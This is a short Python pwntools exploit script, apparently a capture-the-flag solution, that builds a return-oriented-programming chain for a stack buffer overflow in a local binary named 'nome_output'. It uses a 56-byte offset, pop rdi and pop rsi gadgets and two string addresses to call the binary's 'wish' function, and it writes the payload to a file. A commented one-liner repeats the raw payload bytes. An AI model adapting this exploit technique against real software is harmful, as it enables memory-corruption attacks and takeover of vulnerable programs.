from pwn import *

offset = 56
pop_rdi= 0x00007ffff7fc651e
pop_rsi= 0x00007ffff7fc84da
wish_addr = 0x0000000000401196
appari = 0x402004
shenron = 0x40200b
exe = './nome_output'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
payload2 = flat({
    offset: [
        pop_rdi,  # Pop the next value to RDI
        appari, #Indirizzo della parola 1
        pop_rsi,  # Pop the next value to RSI (and junk into R15)
        shenron, ##Indirizzo della parola 2
        # With params in correct registers, call hacked function
        elf.functions.wish #wish_address
    ]
})
write('payload2', payload2)

#python3 -c 'print "A" * 56 + "\x1e\x65\xfc\xf7\xff\x7f\x00\x00" + "\x04\x20\x40\x00\x00\x00\x00\x00" + "\xda\x84\xfc\xf7\xff\x7f\x00\x00" + "\x0b\x20\x40\x00\x00\x00\x00\x00" + "\x96\x11\x40\x00\x00\x00\x00\x00"'
#nel payload manca un ret;
